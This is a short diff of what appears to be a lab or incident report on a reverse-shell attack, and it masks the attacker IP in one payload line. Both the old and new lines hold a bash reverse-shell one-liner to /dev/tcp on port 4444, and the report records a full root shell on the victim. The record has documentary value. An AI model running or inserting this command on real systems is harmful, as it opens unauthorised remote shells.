@@ -35,7 +35,7 @@
 - **Source IP:** 10.190.0.x (kali-attacker)
 - **Target IP:** 10.190.0.x (victim-machine)
 - **Tool Used:** Netcat (nc) reverse shell
-- **Payload:** `bash -i >& /dev/tcp/10.190.0.4/4444 0>&1`
+- **Payload:** `bash -i >& /dev/tcp/10.190.0.x/4444 0>&1`
 - **Listener Port:** 4444
 - **Outcome:** Full interactive root shell obtained on victim ⚠️
 
